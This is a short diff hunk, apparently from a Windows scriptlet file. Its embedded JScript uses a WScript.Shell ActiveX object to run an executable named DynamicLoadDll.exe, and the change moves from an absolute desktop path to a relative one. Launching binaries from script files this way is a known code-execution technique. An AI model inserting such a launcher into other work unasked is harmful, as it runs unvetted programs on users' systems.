@@ -20,7 +20,7 @@
 	<script language="JScript">
 		<![CDATA[
 	
-			var r = new ActiveXObject("WScript.Shell").Run("C:\Users\user\Desktop\Bublyk\DynamicLoadDll.exe");
+			var r = new ActiveXObject("WScript.Shell").Run("DynamicLoadDll.exe");
 	
 		]]>
 	</script>
